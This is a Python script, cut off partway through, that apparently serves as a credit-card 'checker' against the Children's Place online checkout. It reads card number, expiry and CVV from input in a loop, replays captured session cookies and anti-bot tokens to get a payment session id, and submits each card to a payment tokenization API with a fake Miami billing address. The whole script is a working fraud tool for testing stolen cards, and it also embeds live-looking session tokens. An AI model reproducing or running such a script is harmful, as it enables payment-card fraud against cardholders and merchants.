while True:
    import requests, time
    cc, mm, yy, cvv = input("cc: ").split("|")
    ini = time.time()
    cookies = {
        'iShippingCookie': 'US|en_US|USD|1.0|1.0',
        'tcpState': 'FL',
        'tcpSegment': '5',
        'tcpGeoLoc': '25.7728|-80.1919',
        'tcpZip': '33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299',
        'tcpCountryDetail': 'US',
        'AKA_A2': 'A',
        'feregion': 'mm-west',
        'origin': 'macrometa',
        'bm_mi': '967EBF04D70C4245B8E8B78985B8E35D~YAAQjcBMaB1QuKOTAQAAB0vruxprU4CXhs1Mo+oHGnnixmSKKZa/qDHaEhSjE7hNf3FUhoTivDMcTbsJnOCmyR4bgPfoiEUjU0+kg1yACfRyQ09tWRgHCf22NhMYve57A6mAY5HAKCh3Gt4GssbLPuxelYpi/47rb2Td7KrBeoCy49Flij+PKVAqraqlUhn0DJLWG2n8IMCDGpOYcsmgJegbgiuOBmC1YOI+/5d55IlT0vQ/GlOr07TIid8THbWbIcHEHZ0zuI6ipxPv2wm4px1skt8tHPaISvFXErWMMo7Q8eZWy6y0fzyeAxnMUU3c7YgT2Red48KRnhz8CT1OGGjo3qo/gqz1uY3eYogfVb9TpQ8=~1',
        'LandingBrand': 'tcp',
        '_ga': 'GA1.1.1730604613.1734024620',
        'userToken': 'eyJ2ZXIiOiIxLjAiLCJqa3UiOiJzbGFzL3Byb2QvYmZ2Zl9wcmQiLCJraWQiOiJmYTM2NDJlZC0wODIxLTQxODQtYjU2ZS03OTBlOWZjZGQwMmIiLCJ0eXAiOiJqd3QiLCJjbHYiOiJKMi4zLjQiLCJhbGciOiJFUzI1NiJ9.eyJhdXQiOiJHVUlEIiwic2NwIjoic2ZjYy5zaG9wcGVyLW15YWNjb3VudC5iYXNrZXRzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzIHNmY2Muc2hvcHBlci1wcm9kdWN0cyBzZmNjLnNob3BwZXItbXlhY2NvdW50LnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMubG9naW4gc2ZjYy5wd2RsZXNzX2xvZ2luIHNmY2Muc2hvcHBlci1teWFjY291bnQub3JkZXJzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMucmVnaXN0ZXIgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucHJvZHVjdGxpc3RzLnJ3IHNmY2Muc2hvcHBlci1wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLXByb21vdGlvbnMgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzLnJ3IHNmY2Muc2hvcHBlci1naWZ0LWNlcnRpZmljYXRlcyBzZmNjLnNob3BwZXItcHJvZHVjdC1zZWFyY2ggc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLWNhdGVnb3JpZXMgc2ZjYy5zaG9wcGVyLW15YWNjb3VudCIsInN1YiI6ImNjLXNsYXM6OmJmdmZfcHJkOjpzY2lkOjI0MDI5ZTIzLWMxZDEtNDRlZC1hYmM0LTNiN2M5YWI2Yzk3Mzo6dXNpZDpmYTg2NmIyZC04NTgzLTRlMDctOTc4YS03OTQ3YzQ4OGY2NzAiLCJjdHgiOiJzbGFzIiwiaXNzIjoic2xhcy9wcm9kL2JmdmZfcHJkIiwiaXN0IjoxLCJkbnQiOiIwIiwiYXVkIjoiY29tbWVyY2VjbG91ZC9wcm9kL2JmdmZfcHJkIiwibmJmIjoxNzM0MDI0NjE1LCJzdHkiOiJVc2VyIiwiaXNiIjoidWlkbzpzbGFzOjp1cG46R3Vlc3Q6OnVpZG46R3Vlc3QgVXNlcjo6Z2NpZDpiY3hLYzJsSHhHa0tvUm1iczJrV1lZeHJhMTo6Y2hpZDpQTEFDRV9VUyIsImV4cCI6MTczNDAyNjQ0NSwiaWF0IjoxNzM0MDI0NjQ1LCJqdGkiOiJDMkMxMTUyMjIwODc1MC0xMjI0MDc4MjE0MTI2OTkyNDYwNDA5NjM3NzIifQ.RWSOcsMgaypMDRrpJj4BWilqmfTW7CB4oVKLkPVZchlcAK9g6B_aO19_IlyMohGFXt2Egp047i-Ts-7fGhheaQ',
        'usid': 'fa866b2d-8583-4e07-978a-7947c488f670',
        'gcid': 'bcxKc2lHxGkKoRmbs2kWYYxra1',
        'basketId': '38c198f4019b9d545ee30202a0',
        'cartItems': 'SF|00197710368305_1',
        'cartItemsCount': '1',
        'amp_365902': 'IU9zndZtay6wrLrZtwV847...1ietuoior.1ietuoip5.0.2.2',
        '_gcl_au': '1.1.1606285197.1734024596.2044620999.1734024689.1734024688',
        'smsSubscriptionStatus': 'false',
        'subscribedPhoneNumber': 'null',
        'unsubscribedPhoneNumber': '3234231234',
        'pv': '6',
        'ak_bmsc': 'FCB2B16B81709A0BAF37551EFB7FFE31~000000000000000000000000000000~YAAQjcBMaJ9iuqOTAQAAeq3wuxrgR/wdq3y/txk+QcBnv4I6gfyYw7Tu7KXIr7O4fZqxYEKkmqZEnQzNWEq1ijVlgCnU8XXZB/YtKifFq0wtianOn4S9fOMvyl4Qd19zjjIHq4BQjvNXDGBQ/2PyLiLZ6eSE1SgMJr2s3hisNSD8xwBzxpk56UIGZbMlgX7/22USpsZhnTc5hApLGcu3/OCO5DciNZCgWb+XUTVuuM+8z/PFhztMRUI6QD/HY/lEDayCbZVoOZ6ieRKErc8cnI3XJxez2IUQJrU+0udBvKgUTHl7nJ068XWj+/c9NE02PMmmbrG2D2z0nW2jS0IiFxAo1zXYr9yDo1w3GJ/+a8PAV/8p8YieaCKoyHkfZslTmTn9eUrcX3U2kPkaLRXwkfvkaD+iOfNLopxVwnNIRwy5SeFrTtNG+exR+l5nx0poGc9Iv83rQ6DQFBMHpNUZnqhzbBZovz9a+kaYJ2Y+ysyP3UHzsvyefSV2eqTz5MdQFvGhEKdooSxW03nUJVe9aOZ2',
        '_ga_Z18SEZPZ6D': 'GS1.1.1734024619.1.1.1734025077.60.0.0',
        'bm_sv': 'BCBC226F6A6089BBC9C546EE5BF1810F~YAAQjcBMaONju6OTAQAAD0LzuxoFwoOZ7lH1ZcQ79/TN+jcfSkuwZ7i5W4emahkJetXHCYa2Q8OkbgOwSbHidBD8YUTHD5SdO7zpDPUim09hXmDCmFcjSR2//C/ccE5I1A2TYdL7TUHNr0dBVs7r3kX9KnG8u0+XnR8FRKbx3Y2Dt3U9VDbA/GeJ1l7YZSghc6QjSnJeTOLQFt9BL19kIek09zASXOLmXItNk2Bzjf60N2KuB1pF9uHeEMNxel6YmMuwqyPx9VV0~1',
        'bm_sz': '7F34158F810F8737FB322BAC18B37DE3~YAAQjcBMaORju6OTAQAAD0LzuxqZdJjlb2JzN0jIeGTNp+/4gFVw42AYaUJAyKpKltWocs++wQh+zcQOct/QT4IFeISoRbyeRcaAch8mQSwlcX82pZ4ejc3d6xpaTS/GybtYKb8KsRsDU9clip68rRNv7JnHToqQN6DvKLqvaR3hzFsfMwq6XSpJR1RAL+CslErhdZXrp1gcFSAMwo6su6ajaJ3QKlmHKzVpBP/tULWLQ/MKWybtA1qX8WPvJ4XZF6NkN/YCH3EEypWHL3pTJmSD7/fECcvyFwAtx3hbKucl/6dB1jzLgUxGPVXggbvyg9fqrGhzohyBNzVSBYBwGfNLF9xg8vtAXgZKMG6sX7BLmbMLCzjIEAkLT1PSnA6tpdueiKRc+h+cqiwgqrStxIzZ+TxTB9qRoStZ9qwsUp8cu8vKKXhldcZsPaTdyLfr+qmLmFrrM3g9N7VGSzCkUZlKW6u4Cg==~4474166~4276791',
        '_abck': 'EEBA09C8670DC21B03A27B341764314A~-1~YAAQjcBMaJzCu6OTAQAAK1P0uw0IpoIqdQjQV0NSIGrTeB9lTasMhNkzg7mMn75JA2eyx1khkks0elpo2USkkHJOlhXnIIEe423iGQnJOHRGXGR2AJCD1nSATsrUHdAHm/InLZtKpXUatbsFTb0wlhhxege95T9LaaOW9BazFQIgFqIWuCCJP9oFgD/8BoLHuu0PfGcA1O5iV6ypFljTq5fMzqnhXXYZqAc9LAdqgQ/2g+tnajLqjtoXxsuJavjG78YClkDjCeCEIBR9TLDhxkpyoyhCJKuThbcVOziK712Mj6qtt30wq/tCkWvnXFpUEBsDGDRIs62p3ceXOZEi0UDW1GEDo13CIU/Xu9/Vs5f2D/leZDP8S85VwIIV4KKWbbXaDhfaVJSnXAUsvUsH3nq+LKTN9gHNpwoKtyUmHlZZF3jSPbRG9y2yK/W0QXeV3my7PNvEI2+fW1qKfMqIlaTKHH11hI/vWmXMDPoS1mTmrxAb77wOlKMQxZG/HVjci+NNlMha/QoPm3hh2Ipdabzk4e/r/dLRy1s/WTSfjHVwzdaA23R5D2Cijk1O1dF1adeATJQ93y9SBGpWNQw9iz1j7mW7iOGjcfg04917bhMTVxfvIwiHqe9Rg7QCVu53sVo3tx0VvWLvaAhEo+epijYpHiIp+PINrw+7ghN41Nb1gBoAxTRbExeG1c8rOekaFbsGuvNaH57CceojBy97OKpogXmU6dFG/cjRfXMRWjnm9OodKrFaJ37AhYTX95smhbhPOBjVirz9IdzkRQOn3PvnfvXEPGwJM4cnDsLG1SY4TD/ffVEd7c/zwTZt~-1~-1~1734028182',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'es-419,es;q=0.9',
        'cache-control': 'no-store, must-revalidate',
        'client_source': 'tcp-us-checkout',
        # 'cookie': 'iShippingCookie=US|en_US|USD|1.0|1.0; tcpState=FL; tcpSegment=5; tcpGeoLoc=25.7728|-80.1919; tcpZip=33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299; tcpCountryDetail=US; AKA_A2=A; feregion=mm-west; origin=macrometa; bm_mi=967EBF04D70C4245B8E8B78985B8E35D~YAAQjcBMaB1QuKOTAQAAB0vruxprU4CXhs1Mo+oHGnnixmSKKZa/qDHaEhSjE7hNf3FUhoTivDMcTbsJnOCmyR4bgPfoiEUjU0+kg1yACfRyQ09tWRgHCf22NhMYve57A6mAY5HAKCh3Gt4GssbLPuxelYpi/47rb2Td7KrBeoCy49Flij+PKVAqraqlUhn0DJLWG2n8IMCDGpOYcsmgJegbgiuOBmC1YOI+/5d55IlT0vQ/GlOr07TIid8THbWbIcHEHZ0zuI6ipxPv2wm4px1skt8tHPaISvFXErWMMo7Q8eZWy6y0fzyeAxnMUU3c7YgT2Red48KRnhz8CT1OGGjo3qo/gqz1uY3eYogfVb9TpQ8=~1; LandingBrand=tcp; _ga=GA1.1.1730604613.1734024620; userToken=eyJ2ZXIiOiIxLjAiLCJqa3UiOiJzbGFzL3Byb2QvYmZ2Zl9wcmQiLCJraWQiOiJmYTM2NDJlZC0wODIxLTQxODQtYjU2ZS03OTBlOWZjZGQwMmIiLCJ0eXAiOiJqd3QiLCJjbHYiOiJKMi4zLjQiLCJhbGciOiJFUzI1NiJ9.eyJhdXQiOiJHVUlEIiwic2NwIjoic2ZjYy5zaG9wcGVyLW15YWNjb3VudC5iYXNrZXRzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzIHNmY2Muc2hvcHBlci1wcm9kdWN0cyBzZmNjLnNob3BwZXItbXlhY2NvdW50LnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMubG9naW4gc2ZjYy5wd2RsZXNzX2xvZ2luIHNmY2Muc2hvcHBlci1teWFjY291bnQub3JkZXJzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMucmVnaXN0ZXIgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucHJvZHVjdGxpc3RzLnJ3IHNmY2Muc2hvcHBlci1wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLXByb21vdGlvbnMgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzLnJ3IHNmY2Muc2hvcHBlci1naWZ0LWNlcnRpZmljYXRlcyBzZmNjLnNob3BwZXItcHJvZHVjdC1zZWFyY2ggc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLWNhdGVnb3JpZXMgc2ZjYy5zaG9wcGVyLW15YWNjb3VudCIsInN1YiI6ImNjLXNsYXM6OmJmdmZfcHJkOjpzY2lkOjI0MDI5ZTIzLWMxZDEtNDRlZC1hYmM0LTNiN2M5YWI2Yzk3Mzo6dXNpZDpmYTg2NmIyZC04NTgzLTRlMDctOTc4YS03OTQ3YzQ4OGY2NzAiLCJjdHgiOiJzbGFzIiwiaXNzIjoic2xhcy9wcm9kL2JmdmZfcHJkIiwiaXN0IjoxLCJkbnQiOiIwIiwiYXVkIjoiY29tbWVyY2VjbG91ZC9wcm9kL2JmdmZfcHJkIiwibmJmIjoxNzM0MDI0NjE1LCJzdHkiOiJVc2VyIiwiaXNiIjoidWlkbzpzbGFzOjp1cG46R3Vlc3Q6OnVpZG46R3Vlc3QgVXNlcjo6Z2NpZDpiY3hLYzJsSHhHa0tvUm1iczJrV1lZeHJhMTo6Y2hpZDpQTEFDRV9VUyIsImV4cCI6MTczNDAyNjQ0NSwiaWF0IjoxNzM0MDI0NjQ1LCJqdGkiOiJDMkMxMTUyMjIwODc1MC0xMjI0MDc4MjE0MTI2OTkyNDYwNDA5NjM3NzIifQ.RWSOcsMgaypMDRrpJj4BWilqmfTW7CB4oVKLkPVZchlcAK9g6B_aO19_IlyMohGFXt2Egp047i-Ts-7fGhheaQ; usid=fa866b2d-8583-4e07-978a-7947c488f670; gcid=bcxKc2lHxGkKoRmbs2kWYYxra1; basketId=38c198f4019b9d545ee30202a0; cartItems=SF|00197710368305_1; cartItemsCount=1; amp_365902=IU9zndZtay6wrLrZtwV847...1ietuoior.1ietuoip5.0.2.2; _gcl_au=1.1.1606285197.1734024596.2044620999.1734024689.1734024688; smsSubscriptionStatus=false; subscribedPhoneNumber=null; unsubscribedPhoneNumber=3234231234; pv=6; ak_bmsc=FCB2B16B81709A0BAF37551EFB7FFE31~000000000000000000000000000000~YAAQjcBMaJ9iuqOTAQAAeq3wuxrgR/wdq3y/txk+QcBnv4I6gfyYw7Tu7KXIr7O4fZqxYEKkmqZEnQzNWEq1ijVlgCnU8XXZB/YtKifFq0wtianOn4S9fOMvyl4Qd19zjjIHq4BQjvNXDGBQ/2PyLiLZ6eSE1SgMJr2s3hisNSD8xwBzxpk56UIGZbMlgX7/22USpsZhnTc5hApLGcu3/OCO5DciNZCgWb+XUTVuuM+8z/PFhztMRUI6QD/HY/lEDayCbZVoOZ6ieRKErc8cnI3XJxez2IUQJrU+0udBvKgUTHl7nJ068XWj+/c9NE02PMmmbrG2D2z0nW2jS0IiFxAo1zXYr9yDo1w3GJ/+a8PAV/8p8YieaCKoyHkfZslTmTn9eUrcX3U2kPkaLRXwkfvkaD+iOfNLopxVwnNIRwy5SeFrTtNG+exR+l5nx0poGc9Iv83rQ6DQFBMHpNUZnqhzbBZovz9a+kaYJ2Y+ysyP3UHzsvyefSV2eqTz5MdQFvGhEKdooSxW03nUJVe9aOZ2; _ga_Z18SEZPZ6D=GS1.1.1734024619.1.1.1734025077.60.0.0; bm_sv=BCBC226F6A6089BBC9C546EE5BF1810F~YAAQjcBMaONju6OTAQAAD0LzuxoFwoOZ7lH1ZcQ79/TN+jcfSkuwZ7i5W4emahkJetXHCYa2Q8OkbgOwSbHidBD8YUTHD5SdO7zpDPUim09hXmDCmFcjSR2//C/ccE5I1A2TYdL7TUHNr0dBVs7r3kX9KnG8u0+XnR8FRKbx3Y2Dt3U9VDbA/GeJ1l7YZSghc6QjSnJeTOLQFt9BL19kIek09zASXOLmXItNk2Bzjf60N2KuB1pF9uHeEMNxel6YmMuwqyPx9VV0~1; bm_sz=7F34158F810F8737FB322BAC18B37DE3~YAAQjcBMaORju6OTAQAAD0LzuxqZdJjlb2JzN0jIeGTNp+/4gFVw42AYaUJAyKpKltWocs++wQh+zcQOct/QT4IFeISoRbyeRcaAch8mQSwlcX82pZ4ejc3d6xpaTS/GybtYKb8KsRsDU9clip68rRNv7JnHToqQN6DvKLqvaR3hzFsfMwq6XSpJR1RAL+CslErhdZXrp1gcFSAMwo6su6ajaJ3QKlmHKzVpBP/tULWLQ/MKWybtA1qX8WPvJ4XZF6NkN/YCH3EEypWHL3pTJmSD7/fECcvyFwAtx3hbKucl/6dB1jzLgUxGPVXggbvyg9fqrGhzohyBNzVSBYBwGfNLF9xg8vtAXgZKMG6sX7BLmbMLCzjIEAkLT1PSnA6tpdueiKRc+h+cqiwgqrStxIzZ+TxTB9qRoStZ9qwsUp8cu8vKKXhldcZsPaTdyLfr+qmLmFrrM3g9N7VGSzCkUZlKW6u4Cg==~4474166~4276791; _abck=EEBA09C8670DC21B03A27B341764314A~-1~YAAQjcBMaJzCu6OTAQAAK1P0uw0IpoIqdQjQV0NSIGrTeB9lTasMhNkzg7mMn75JA2eyx1khkks0elpo2USkkHJOlhXnIIEe423iGQnJOHRGXGR2AJCD1nSATsrUHdAHm/InLZtKpXUatbsFTb0wlhhxege95T9LaaOW9BazFQIgFqIWuCCJP9oFgD/8BoLHuu0PfGcA1O5iV6ypFljTq5fMzqnhXXYZqAc9LAdqgQ/2g+tnajLqjtoXxsuJavjG78YClkDjCeCEIBR9TLDhxkpyoyhCJKuThbcVOziK712Mj6qtt30wq/tCkWvnXFpUEBsDGDRIs62p3ceXOZEi0UDW1GEDo13CIU/Xu9/Vs5f2D/leZDP8S85VwIIV4KKWbbXaDhfaVJSnXAUsvUsH3nq+LKTN9gHNpwoKtyUmHlZZF3jSPbRG9y2yK/W0QXeV3my7PNvEI2+fW1qKfMqIlaTKHH11hI/vWmXMDPoS1mTmrxAb77wOlKMQxZG/HVjci+NNlMha/QoPm3hh2Ipdabzk4e/r/dLRy1s/WTSfjHVwzdaA23R5D2Cijk1O1dF1adeATJQ93y9SBGpWNQw9iz1j7mW7iOGjcfg04917bhMTVxfvIwiHqe9Rg7QCVu53sVo3tx0VvWLvaAhEo+epijYpHiIp+PINrw+7ghN41Nb1gBoAxTRbExeG1c8rOekaFbsGuvNaH57CceojBy97OKpogXmU6dFG/cjRfXMRWjnm9OodKrFaJ37AhYTX95smhbhPOBjVirz9IdzkRQOn3PvnfvXEPGwJM4cnDsLG1SY4TD/ffVEd7c/zwTZt~-1~-1~1734028182',
        'devicetype': 'desktop',
        'expires': '0',
        'langid': '-1',
        'language': 'en-US',
        'platform': 'SF',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://www.childrensplace.com/us/checkout',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-viewport-width': '707',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'siteid': 'PLACE_US',
        'tcp-trace-request-id': 'CLIENT_1_1734025175005914',
        'tcp-trace-session-id': 'not-found',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'usid_dup': 'fa866b2d-8583-4e07-978a-7947c488f670',
        'x-tcp-channel': '',
    }

    response = requests.get(
        'https://www.childrensplace.com/api/stateful/payment/v2/creditCard/sessionId',
        cookies=cookies,
        headers=headers,
    )
    sessionId = response.json()["data"]["SessionId"]

    import requests

    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'es-419,es;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://www.childrensplace.com',
        'Referer': 'https://www.childrensplace.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'SessionId': sessionId,
        'CardNumber': cc,
        'Expiration': f'{mm}{yy}',
        'CVN': cvv,
        'AVS': {
            'Address': '3234 gtrgrtgnull',
            'City': 'Miami',
            'State': 'FL',
            'Zip': '33132',
            'Country': 'US',
        },
    }

    response = requests.post(
        'https://api.paysecure.acculynk.net/json/reply/ClientTokenizeCardRequest',
        headers=headers,
        json=json_data,
    )


    cookies = {
        'iShippingCookie': 'US|en_US|USD|1.0|1.0',
        'tcpState': 'FL',
        'tcpSegment': '5',
        'tcpGeoLoc': '25.7728|-80.1919',
        'tcpZip': '33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299',
        'tcpCountryDetail': 'US',
        'AKA_A2': 'A',
        'feregion': 'mm-west',
        'origin': 'macrometa',
        'bm_mi': '967EBF04D70C4245B8E8B78985B8E35D~YAAQjcBMaB1QuKOTAQAAB0vruxprU4CXhs1Mo+oHGnnixmSKKZa/qDHaEhSjE7hNf3FUhoTivDMcTbsJnOCmyR4bgPfoiEUjU0+kg1yACfRyQ09tWRgHCf22NhMYve57A6mAY5HAKCh3Gt4GssbLPuxelYpi/47rb2Td7KrBeoCy49Flij+PKVAqraqlUhn0DJLWG2n8IMCDGpOYcsmgJegbgiuOBmC1YOI+/5d55IlT0vQ/GlOr07TIid8THbWbIcHEHZ0zuI6ipxPv2wm4px1skt8tHPaISvFXErWMMo7Q8eZWy6y0fzyeAxnMUU3c7YgT2Red48KRnhz8CT1OGGjo3qo/gqz1uY3eYogfVb9TpQ8=~1',
        'LandingBrand': 'tcp',
        '_ga': 'GA1.1.1730604613.1734024620',
        'userToken': 'eyJ2ZXIiOiIxLjAiLCJqa3UiOiJzbGFzL3Byb2QvYmZ2Zl9wcmQiLCJraWQiOiJmYTM2NDJlZC0wODIxLTQxODQtYjU2ZS03OTBlOWZjZGQwMmIiLCJ0eXAiOiJqd3QiLCJjbHYiOiJKMi4zLjQiLCJhbGciOiJFUzI1NiJ9.eyJhdXQiOiJHVUlEIiwic2NwIjoic2ZjYy5zaG9wcGVyLW15YWNjb3VudC5iYXNrZXRzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzIHNmY2Muc2hvcHBlci1wcm9kdWN0cyBzZmNjLnNob3BwZXItbXlhY2NvdW50LnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMubG9naW4gc2ZjYy5wd2RsZXNzX2xvZ2luIHNmY2Muc2hvcHBlci1teWFjY291bnQub3JkZXJzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMucmVnaXN0ZXIgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucHJvZHVjdGxpc3RzLnJ3IHNmY2Muc2hvcHBlci1wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLXByb21vdGlvbnMgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzLnJ3IHNmY2Muc2hvcHBlci1naWZ0LWNlcnRpZmljYXRlcyBzZmNjLnNob3BwZXItcHJvZHVjdC1zZWFyY2ggc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLWNhdGVnb3JpZXMgc2ZjYy5zaG9wcGVyLW15YWNjb3VudCIsInN1YiI6ImNjLXNsYXM6OmJmdmZfcHJkOjpzY2lkOjI0MDI5ZTIzLWMxZDEtNDRlZC1hYmM0LTNiN2M5YWI2Yzk3Mzo6dXNpZDpmYTg2NmIyZC04NTgzLTRlMDctOTc4YS03OTQ3YzQ4OGY2NzAiLCJjdHgiOiJzbGFzIiwiaXNzIjoic2xhcy9wcm9kL2JmdmZfcHJkIiwiaXN0IjoxLCJkbnQiOiIwIiwiYXVkIjoiY29tbWVyY2VjbG91ZC9wcm9kL2JmdmZfcHJkIiwibmJmIjoxNzM0MDI0NjE1LCJzdHkiOiJVc2VyIiwiaXNiIjoidWlkbzpzbGFzOjp1cG46R3Vlc3Q6OnVpZG46R3Vlc3QgVXNlcjo6Z2NpZDpiY3hLYzJsSHhHa0tvUm1iczJrV1lZeHJhMTo6Y2hpZDpQTEFDRV9VUyIsImV4cCI6MTczNDAyNjQ0NSwiaWF0IjoxNzM0MDI0NjQ1LCJqdGkiOiJDMkMxMTUyMjIwODc1MC0xMjI0MDc4MjE0MTI2OTkyNDYwNDA5NjM3NzIifQ.RWSOcsMgaypMDRrpJj4BWilqmfTW7CB4oVKLkPVZchlcAK9g6B_aO19_IlyMohGFXt2Egp047i-Ts-7fGhheaQ',
        'usid': 'fa866b2d-8583-4e07-978a-7947c488f670',
        'gcid': 'bcxKc2lHxGkKoRmbs2kWYYxra1',
        'basketId': '38c198f4019b9d545ee30202a0',
        'cartItems': 'SF|00197710368305_1',
        'cartItemsCount': '1',
        'amp_365902': 'IU9zndZtay6wrLrZtwV847...1ietuoior.1ietuoip5.0.2.2',
        '_gcl_au': '1.1.1606285197.1734024596.2044620999.1734024689.1734024688',
        'smsSubscriptionStatus': 'false',
        'subscribedPhoneNumber': 'null',
        'unsubscribedPhoneNumber': '3234231234',
        'pv': '6',
        'ak_bmsc': 'FCB2B16B81709A0BAF37551EFB7FFE31~000000000000000000000000000000~YAAQjcBMaJ9iuqOTAQAAeq3wuxrgR/wdq3y/txk+QcBnv4I6gfyYw7Tu7KXIr7O4fZqxYEKkmqZEnQzNWEq1ijVlgCnU8XXZB/YtKifFq0wtianOn4S9fOMvyl4Qd19zjjIHq4BQjvNXDGBQ/2PyLiLZ6eSE1SgMJr2s3hisNSD8xwBzxpk56UIGZbMlgX7/22USpsZhnTc5hApLGcu3/OCO5DciNZCgWb+XUTVuuM+8z/PFhztMRUI6QD/HY/lEDayCbZVoOZ6ieRKErc8cnI3XJxez2IUQJrU+0udBvKgUTHl7nJ068XWj+/c9NE02PMmmbrG2D2z0nW2jS0IiFxAo1zXYr9yDo1w3GJ/+a8PAV/8p8YieaCKoyHkfZslTmTn9eUrcX3U2kPkaLRXwkfvkaD+iOfNLopxVwnNIRwy5SeFrTtNG+exR+l5nx0poGc9Iv83rQ6DQFBMHpNUZnqhzbBZovz9a+kaYJ2Y+ysyP3UHzsvyefSV2eqTz5MdQFvGhEKdooSxW03nUJVe9aOZ2',
        '_ga_Z18SEZPZ6D': 'GS1.1.1734024619.1.1.1734025077.60.0.0',
        'bm_sz': '7F34158F810F8737FB322BAC18B37DE3~YAAQjcBMaORju6OTAQAAD0LzuxqZdJjlb2JzN0jIeGTNp+/4gFVw42AYaUJAyKpKltWocs++wQh+zcQOct/QT4IFeISoRbyeRcaAch8mQSwlcX82pZ4ejc3d6xpaTS/GybtYKb8KsRsDU9clip68rRNv7JnHToqQN6DvKLqvaR3hzFsfMwq6XSpJR1RAL+CslErhdZXrp1gcFSAMwo6su6ajaJ3QKlmHKzVpBP/tULWLQ/MKWybtA1qX8WPvJ4XZF6NkN/YCH3EEypWHL3pTJmSD7/fECcvyFwAtx3hbKucl/6dB1jzLgUxGPVXggbvyg9fqrGhzohyBNzVSBYBwGfNLF9xg8vtAXgZKMG6sX7BLmbMLCzjIEAkLT1PSnA6tpdueiKRc+h+cqiwgqrStxIzZ+TxTB9qRoStZ9qwsUp8cu8vKKXhldcZsPaTdyLfr+qmLmFrrM3g9N7VGSzCkUZlKW6u4Cg==~4474166~4276791',
